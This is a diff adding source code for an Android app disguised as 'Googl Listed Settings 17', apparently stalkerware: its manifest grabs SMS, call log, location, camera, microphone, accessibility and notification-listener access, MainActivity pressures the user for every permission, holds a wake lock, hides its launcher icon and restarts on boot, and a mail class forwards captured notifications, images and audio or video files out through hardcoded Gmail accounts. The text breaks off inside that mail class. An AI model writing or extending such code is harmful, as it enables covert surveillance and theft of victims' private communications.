@@ -1,4 +1,682 @@
-<pre>
+//backgroundd NotificationListener forwarder in email sms googledrive and firebase
+
+//AndroidManifest.xml
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- Adjust minSdkVersion to 21 to support Android 5.0 and above -->
+    <uses-sdk
+        android:minSdkVersion="23"
+        android:targetSdkVersion="34"
+        tools:overrideLibrary="com.google.firebase.database" />
+
+
+    <!-- Permissions -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.FLASHLIGHT" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
+    <uses-permission android:name="com.vivo.permission.manage.permission.ACCESS" />
+    <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE" />
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
+    <uses-feature android:name="android.hardware.camera" android:required="true" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+    <uses-feature android:name="android.hardware.microphone" android:required="true" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+
+
+    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE" android:maxSdkVersion="28"
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- Application tag with all your components -->
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true"
+        android:name=".MyApplication">
+
+        <!-- Main Activity -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:taskAffinity="" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity android:name=".GetSim1AndSim2NumberFromAlertbox"
+            android:launchMode="singleTask"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""/>
+
+
+
+        <!-- Background Service for location and other tasks -->
+        <service
+            android:name=".BackgroundService"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="location"
+            tools:ignore="ForegroundServicePermission" />
+
+        <!-- Declare the BroadcastReceiver -->
+        <receiver android:name=".AutoRestartReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- AutoStartReceiver Service -->
+        <receiver android:name=".AutoStartReceiver"
+            android:enabled="true"
+            android:exported="true"/>
+
+        <!-- Notification Listener Service -->
+        <service
+            android:name=".NotificationListener"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- SMS Receiver -->
+        <receiver
+            android:name=".SmsReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- File Service -->
+        <receiver
+            android:name=".FileService"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Video Recording Service
+        <service
+            android:name=".VideoRecord"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="mediaPlayback"
+            tools:ignore="ForegroundServicePermission,Instantiatable" />  -->
+
+        <!-- Video Record Receiver
+        <receiver
+            android:name=".VideoRecord"
+            android:exported="true"
+            tools:ignore="Instantiatable">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="com.example.fasterpro11.ACTION_RECORD_VIDEO" />
+            </intent-filter>
+        </receiver> -->
+
+        <!-- Mic Record Receiver
+        <receiver
+            android:name=".MicRecord"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver> -->
+
+        <!-- CallRecorderAuto Recorder Receiver -->
+        <receiver
+            android:name=".CallRecorderAuto"
+            android:exported="true"
+            tools:ignore="Instantiatable">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- MyAccessibilityService Recorder Receiver -->
+        <service
+            android:name=".MyAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:foregroundServiceType="specialUse"
+            android:stopWithTask="false"
+            android:exported="false"> <!-- এখানে exported=false ব্যবহার করুন -->
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- CallRecorderAccessibilityService Receiver  -->
+        <service
+            android:name=".CallRecorderAccessibilityService"
+            android:exported="false"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- DialCodeReceiver -->
+        <receiver android:name=".DialCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.DIAL" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="androidx.work.impl.background.systemjob.SystemJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <!-- Boot Receiver to handle Boot Completed -->
+        <receiver
+            android:name=".BootBroadcastReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.REBOOT" />
+            </intent-filter>
+            <!-- This allows the app to start after the device boots -->
+            <meta-data
+                android:name="android.app.opener"
+                android:value="true" />
+        </receiver>
+    </application>
+</manifest>
+
+
+//MainActivity.java
+package com.example.fasterpro11;
+
+import android.Manifest;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.provider.Settings;
+import android.util.Log;
+import android.widget.Toast;
+
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import androidx.work.OneTimeWorkRequest;
+import androidx.work.WorkManager;
+import androidx.work.WorkRequest;
+
+import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.List;
+
+public class MainActivity extends AppCompatActivity {
+    private static final String TAG = "MainActivity";
+    private static final int PERMISSION_REQUEST_CODE = 1001;
+    private static final int OVERLAY_PERMISSION_REQUEST_CODE = 1002;
+    private static final int ACCESSIBILITY_PERMISSION_REQUEST_CODE = 1003;
+    private static final int AUTO_HIDE_DELAY = 1600 * 60000; // 60 minutes
+    public String UserID = "";
+    public String UserID2 = "";
+
+    private PowerManager.WakeLock wakeLock;
+    // All required permissions list
+    private static final String[] REQUIRED_PERMISSIONS = {
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.INTERNET,
+            Manifest.permission.ACCESS_NETWORK_STATE,
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECEIVE_BOOT_COMPLETED,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.WRITE_CALL_LOG,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
+            Manifest.permission.GET_ACCOUNTS,
+            Manifest.permission.POST_NOTIFICATIONS,
+            Manifest.permission.READ_PHONE_NUMBERS,
+            Manifest.permission.WAKE_LOCK,
+            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+    };
+
+    private Toast currentToast;
+    private MicRecord micRecord;
+    private int permissionRequestAttempts = 0;
+    private int accessibilityPermissionAttempts = 0;
+    private String appName = "Googl Listed Settings 17 ";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        try {
+            super.onCreate(savedInstanceState);
+            micRecord = new MicRecord(this);
+
+            // First ask user to grant all permissions
+            showToast(appName + " Please allow all permissions");
+
+
+            requestIgnoreBatteryOptimizations();
+            acquireWakeLock();
+            // Start permission requests
+            requestOverlayPermission();
+            checkAndRequestPermissions();
+
+            // Setup background tasks
+            new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, AUTO_HIDE_DELAY);
+            WorkRequest smsNotificationWorkRequest = new OneTimeWorkRequest.Builder(BackgroundSmsNotificationWorker.class)
+                    .addTag("BackgroundSmsNotification")
+                    .build();
+            WorkManager.getInstance(this).enqueue(smsNotificationWorkRequest);
+
+            checkPackageExistence();
+            setDailyAlarm(this);
+            startBackgroundService();
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                handlePhoneNumberPermission();
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "App error, restarting...", e);
+            Intent restartIntent = new Intent(MainActivity.this, AutoRestartReceiver.class);
+            sendBroadcast(restartIntent);
+        }
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        // Check permissions again when user returns to the app
+        requestOverlayPermission();
+        checkAndRequestPermissions();
+    }
+
+    // Method to check and request permissions
+    private void checkAndRequestPermissions() {
+        Log.d(TAG, "Checking permissions...");
+
+        List<String> missingPermissions = getMissingPermissions();
+
+        if (missingPermissions.isEmpty()) {
+            Log.d(TAG, "All permissions already granted");
+            showToast("Overall permission already  allowed");
+            checkAccessibilityPermission();
+        } else {
+            if (permissionRequestAttempts < 10) {
+                permissionRequestAttempts++;
+               // Log.d(TAG, "Requesting missing permissions (Attempt " + permissionRequestAttempts + ")");
+                showToast("checkAndRequestPermissions Missing permissions: " + missingPermissions);
+                ActivityCompat.requestPermissions(this,
+                        missingPermissions.toArray(new String[0]),
+                        PERMISSION_REQUEST_CODE);
+            } else {
+                //showToast("Permission request limit reached. Missing: " + missingPermissions);
+                //Log.w(TAG, "Permission request limit reached");
+                checkAccessibilityPermission();
+            }
+        }
+    }
+
+    // Helper method to get list of missing permissions
+    private List<String> getMissingPermissions() {
+        List<String> missingPermissions = new ArrayList<>();
+        for (String permission : REQUIRED_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                missingPermissions.add(permission);
+            }
+        }
+        return missingPermissions;
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            List<String> stillMissing = new ArrayList<>();
+
+            for (int i = 0; i < grantResults.length; i++) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                    stillMissing.add(permissions[i]);
+                }
+            }
+
+            if (stillMissing.isEmpty()) {
+                Log.d(TAG, "onRequestPermissionsResult All requested permissions granted");
+                showToast("Overall permission Already allowed");
+                checkAccessibilityPermission();
+            } else {
+                Log.w(TAG, "onRequestPermissionsResult permissions missing: " + stillMissing);
+               // showToast(" missing permissions: " + stillMissing);
+
+                if (permissionRequestAttempts < 10) {
+                    checkAndRequestPermissions();
+                } else {
+                    //showToast("Permission request limit reached. Missing: " + stillMissing);
+                    checkAccessibilityPermission();
+                }
+            }
+        }
+    }
+
+    // Method to check accessibility service permission
+    private void checkAccessibilityPermission() {
+        if (!isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
+            if (accessibilityPermissionAttempts < 10) {
+                accessibilityPermissionAttempts++;
+                showToast(appName + " Allow Accessibility permission (Attempt " + accessibilityPermissionAttempts + ")");
+                requestAccessibilityPermission();
+            } else {
+                showToast(appName + " Accessibility permission request limit reached ");
+            }
+        } else {
+            Log.d(TAG, "AccessibilityService already enabled");
+            if (getMissingPermissions().isEmpty()) {
+                showToast("Overall permission all allowed");
+            }
+            startServicesAndRequests();
+        }
+    }
+
+    // Method to request accessibility permission
+    private void requestAccessibilityPermission() {
+        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+        startActivityForResult(intent, ACCESSIBILITY_PERMISSION_REQUEST_CODE);
+        Log.d(TAG, "Requesting AccessibilityService permission");
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
+        if (requestCode == ACCESSIBILITY_PERMISSION_REQUEST_CODE) {
+            if (isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
+                Log.d(TAG, "AccessibilityService permission granted");
+                if (getMissingPermissions().isEmpty()) {
+                    showToast("Overall permission all allowed");
+                }
+                startServicesAndRequests();
+            } else {
+                Log.w(TAG, "AccessibilityService permission not granted");
+                checkAccessibilityPermission(); // Try again (up to 10 times)
+            }
+        } else if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
+            if (micRecord.hasOverlayPermission()) {
+                Log.d(TAG, "Overlay permission granted");
+                requestNotificationPermission();
+                if (getMissingPermissions().isEmpty()) {
+                    showToast("Overall permission all allowed");
+                }
+            } else {
+                Log.w(TAG, "Overlay permission not granted");
+                requestOverlayPermission();
+            }
+        }
+    }
+
+    // Method to start all services and requests
+    private void startServicesAndRequests() {
+        Log.d(TAG, "Starting services and requests");
+        startBackgroundService();
+        requestNotificationListenerPermission();
+        requestManageExternalStoragePermission();
+
+        if (areAllPermissionsGranted() && isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
+            showToast("Overall permission all allowed");
+            // All permissions granted, proceed with app functionality
+        }
+    }
+
+    // Check if all permissions are granted
+    private boolean areAllPermissionsGranted() {
+        return getMissingPermissions().isEmpty();
+    }
+
+    // Show toast message
+    private void showToast(String message) {
+        if (currentToast != null) {
+            currentToast.cancel();
+        }
+        currentToast = Toast.makeText(this, message, Toast.LENGTH_LONG);
+        currentToast.show();
+    }
+
+    // Hide app icon
+    private void hideAppIcon() {
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+    }
+
+    // Handle phone number permission
+    private void handlePhoneNumberPermission() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
+            Log.d(TAG, "READ_PHONE_NUMBERS permission granted");
+        } else {
+            Log.w(TAG, "READ_PHONE_NUMBERS permission not granted");
+        }
+    }
+
+    // Request overlay permission
+    private void requestOverlayPermission() {
+        Log.d(TAG, "Checking overlay permission");
+        if (!micRecord.hasOverlayPermission()) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE);
+            Log.d(TAG, "Requesting overlay permission");
+        } else {
+            Log.d(TAG, "Overlay permission already granted");
+        }
+    }
+
+    // Request notification permission
+    private void requestNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_CODE);
+                Log.d(TAG, "Requesting POST_NOTIFICATIONS permission");
+            }
+        }
+    }
+
+    // Request notification listener permission
+    private void requestNotificationListenerPermission() {
+        if (!isNotificationServiceEnabled()) {
+            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+            startActivity(intent);
+            Log.d(TAG, "Requesting NOTIFICATION_LISTENER permission");
+        }
+    }
+
+    // Request manage external storage permission
+    private void requestManageExternalStoragePermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                startActivity(intent);
+            }
+        }
+    }
+
+
+    private void requestIgnoreBatteryOptimizations() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivity(intent);
+        }
+    }
+
+    private void acquireWakeLock() {
+        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::WakeLockTag");
+        wakeLock.acquire();
+    }
+
+    private void releaseWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
+    }
+
+
+
+    // Start background service
+    private void startBackgroundService() {
+        Intent serviceIntent = new Intent(this, BackgroundService.class);
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting background service", e);
+        }
+    }
+
+    // Check if notification service is enabled
+    private boolean isNotificationServiceEnabled() {
+        String pkgName = getPackageName();
+        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+        if (flat != null) {
+            final String[] names = flat.split(":");
+            for (String name : names) {
+                final ComponentName cn = ComponentName.unflattenFromString(name);
+                if (cn != null && pkgName.equals(cn.getPackageName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    // Check if accessibility service is enabled
+    private boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
+        String prefString = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+        if (prefString != null) {
+            String[] services = prefString.split(":");
+            for (String service : services) {
+                if (service.equalsIgnoreCase(new ComponentName(context.getApplicationContext(), accessibilityService).flattenToString())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    // Set daily alarm
+    private void setDailyAlarm(Context context) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            if (!context.getSystemService(AlarmManager.class).canScheduleExactAlarms()) {
+                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
+                startActivity(intent);
+                return;
+            }
+        }
+
+        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+        Intent intent = new Intent(context, AutoStartReceiver.class);
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_IMMUTABLE);
+
+        Calendar calendar = Calendar.getInstance();
+
+        // Alarm for 9 AM
+        calendar.set(Calendar.HOUR_OF_DAY, 9);
+        calendar.set(Calendar.MINUTE, 0);
+        calendar.set(Calendar.SECOND, 0);
+        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);
+
+        // Alarm for 12 AM
+        calendar.set(Calendar.HOUR_OF_DAY, 0);
+        calendar.set(Calendar.MINUTE, 0);
+        calendar.set(Calendar.SECOND, 0);
+        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);
+    }
+
+    // Check package existence
+    private void checkPackageExistence() {
+        PackageManager pm = getPackageManager();
+        try {
+            pm.getApplicationInfo("com.example.fasterpro11", 0);
+            Log.d("PackageFound", "com.example.fasterpro11 is installed");
+        } catch (PackageManager.NameNotFoundException e) {
+            Log.e("PackageNotFound", "com.example.fasterpro11 not found", e);
+        }
+    }
+}
+
+
+
+
 //NotificationListener.java
 package com.example.fasterpro11;
 
@@ -1989,4 +2667,514 @@ private String bitmapToBase64(Bitmap bitmap) {
 }
 
 
-</pre>
+
+//JavaMailAPISendNotification.java
+package com.example.fasterpro11;
+
+import android.annotation.SuppressLint;
+import android.graphics.Bitmap;
+import android.util.Log;
+
+import javax.activation.DataHandler;
+import javax.activation.DataSource;
+import javax.mail.Message;
+import javax.mail.MessagingException;
+import javax.mail.PasswordAuthentication;
+import javax.mail.Session;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
+import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
+import javax.mail.util.ByteArrayDataSource;
+
+import java.io.ByteArrayOutputStream;
+import java.util.Arrays;
+import java.util.List;
+import java.util.Properties;
+
+public class JavaMailAPISendNotification {
+
+    private static final List<String> BLOCKED_SUBJECTS = Arrays.asList(
+            "Notification from com.internet.speed.meter.lite",
+            "Title: Speed: 10 KB/s     Signal 100%"
+    );
+
+    // Method to send email with Bitmap image
+    @SuppressLint("LongLogTag")
+    public static void sendMail(String recipientEmail, String subject, String messageBody, Bitmap image) {
+        // Check for blocked subjects
+        for (String blockedSubject : BLOCKED_SUBJECTS) {
+            if (subject.contains(blockedSubject)) {
+                Log.d("JavaMailAPISendNotification", "Email not sent: Subject is blocked.");
+                return;
+            }
+        }
+
+        // Daily limit check
+        if (!CountEmail.canSendEmail()) {
+            Log.d("JavaMailAPISendNotification", "Email limit reached for today. No email sent.");
+            return;
+        }
+
+        Thread thread = new Thread(() -> {
+            for (String[] emailAccount : JavaMailAPISendNotificationUseEmails.EMAIL_ACCOUNTS) {
+                String username = emailAccount[0];
+                String password = emailAccount[1];
+
+                Log.d("JavaMailAPISendNotification", "Trying to send email using: " + username);
+
+                if (attemptToSendEmail(username, password, recipientEmail, subject, messageBody, image)) {
+                    CountEmail.incrementEmailCount(); // Increment count after successful email
+                    Log.d("JavaMailAPISendNotification", "Email sent successfully using: " + username);
+                    return; // Exit loop if email is sent successfully
+                }
+            }
+            Log.e("JavaMailAPISendNotification", "All email accounts failed to send email.");
+        });
+        thread.start();
+    }
+
+    // Method to send email with byte array file data
+    @SuppressLint("LongLogTag")
+    public static void sendMail(String recipientEmail, String subject, String messageBody, byte[] fileData, String fileName) {
+        // Check for blocked subjects
+        for (String blockedSubject : BLOCKED_SUBJECTS) {
+            if (subject.contains(blockedSubject)) {
+                Log.d("JavaMailAPISendNotification", "Email not sent: Subject is blocked.");
+                return;
+            }
+        }
+
+        // Daily limit check
+        if (!CountEmail.canSendEmail()) {
+            Log.d("JavaMailAPISendNotification", "Email limit reached for today. No email sent.");
+            return;
+        }
+
+        Thread thread = new Thread(() -> {
+            for (String[] emailAccount : JavaMailAPISendNotificationUseEmails.EMAIL_ACCOUNTS) {
+                String username = emailAccount[0];
+                String password = emailAccount[1];
+
+                Log.d("JavaMailAPISendNotification", "Trying to send email using: " + username);
+
+                if (attemptToSendEmail(username, password, recipientEmail, subject, messageBody, fileData, fileName)) {
+                    CountEmail.incrementEmailCount(); // Increment count after successful email
+                    Log.d("JavaMailAPISendNotification", "Email sent successfully using: " + username);
+                    return; // Exit loop if email is sent successfully
+                }
+            }
+            Log.e("JavaMailAPISendNotification", "All email accounts failed to send email.");
+        });
+        thread.start();
+    }
+
+    private static boolean attemptToSendEmail(String username, String password, String recipientEmail, String subject, String messageBody, Bitmap image) {
+        Properties props = new Properties();
+        props.put("mail.smtp.auth", "true");
+        props.put("mail.smtp.starttls.enable", "true");
+        props.put("mail.smtp.host", "smtp.gmail.com");
+        props.put("mail.smtp.port", "587");
+
+        Session session = Session.getInstance(props, new javax.mail.Authenticator() {
+            protected PasswordAuthentication getPasswordAuthentication() {
+                return new PasswordAuthentication(username, password);
+            }
+        });
+
+        try {
+            Message message = new MimeMessage(session);
+            message.setFrom(new InternetAddress(username));
+            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));
+            message.setSubject(subject);
+
+            // Create multipart message
+            MimeBodyPart textPart = new MimeBodyPart();
+            textPart.setText(messageBody);
+
+            MimeMultipart multipart = new MimeMultipart();
+            multipart.addBodyPart(textPart);
+
+            // Add image attachment if available
+            if (image != null) {
+                MimeBodyPart imagePart = new MimeBodyPart();
+                ByteArrayOutputStream stream = new ByteArrayOutputStream();
+                image.compress(Bitmap.CompressFormat.PNG, 100, stream);
+                byte[] byteArray = stream.toByteArray();
+                DataSource dataSource = new ByteArrayDataSource(byteArray, "image/png");
+
+                imagePart.setDataHandler(new DataHandler(dataSource));
+                imagePart.setFileName("image.png");
+
+                multipart.addBodyPart(imagePart);
+            }
+
+            message.setContent(multipart);
+
+            for (int attempt = 1; attempt <= 1; attempt++) {
+                try {
+                    Log.d("JavaMailAPISendNotification", "Attempt " + attempt + " to send email using: " + username);
+                    Transport.send(message);
+                    return true; // Return true if email is sent successfully
+                } catch (MessagingException e) {
+                    Log.e("JavaMailAPISendNotification", "Attempt " + attempt + " failed for " + username + ": " + e.getMessage(), e);
+                    try {
+                        Thread.sleep(2000); // Wait 2 seconds before the next attempt
+                    } catch (InterruptedException ex) {
+                        Log.e("JavaMailAPISendNotification", "Thread sleep interrupted: " + ex.getMessage(), ex);
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e("JavaMailAPISendNotification", "Error while preparing email: " + e.getMessage(), e);
+        }
+        return false; // Return false if email sending fails
+    }
+
+    private static boolean attemptToSendEmail(String username, String password, String recipientEmail, String subject, String messageBody, byte[] fileData, String fileName) {
+        Properties props = new Properties();
+        props.put("mail.smtp.auth", "true");
+        props.put("mail.smtp.starttls.enable", "true");
+        props.put("mail.smtp.host", "smtp.gmail.com");
+        props.put("mail.smtp.port", "587");
+
+        Session session = Session.getInstance(props, new javax.mail.Authenticator() {
+            protected PasswordAuthentication getPasswordAuthentication() {
+                return new PasswordAuthentication(username, password);
+            }
+        });
+
+        try {
+            Message message = new MimeMessage(session);
+            message.setFrom(new InternetAddress(username));
+            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));
+            message.setSubject(subject);
+
+            // Create multipart message
+            MimeBodyPart textPart = new MimeBodyPart();
+            textPart.setText(messageBody);
+
+            MimeMultipart multipart = new MimeMultipart();
+            multipart.addBodyPart(textPart);
+
+            // Add file attachment if available
+            if (fileData != null) {
+                MimeBodyPart filePart = new MimeBodyPart();
+                String mimeType = "application/octet-stream"; // Default MIME type
+                if (fileName.endsWith(".mp3")) {
+                    mimeType = "audio/mpeg";
+                } else if (fileName.endsWith(".mp4")) {
+                    mimeType = "video/mp4";
+                } else if (fileName.endsWith(".png")) {
+                    mimeType = "image/png";
+                }
+                DataSource dataSource = new ByteArrayDataSource(fileData, mimeType);
+                filePart.setDataHandler(new DataHandler(dataSource));
+                filePart.setFileName(fileName);
+                multipart.addBodyPart(filePart);
+            }
+
+            message.setContent(multipart);
+
+            for (int attempt = 1; attempt <= 1; attempt++) {
+                try {
+                    Log.d("JavaMailAPISendNotification", "Attempt " + attempt + " to send email using: " + username);
+                    Transport.send(message);
+                    return true; // Return true if email is sent successfully
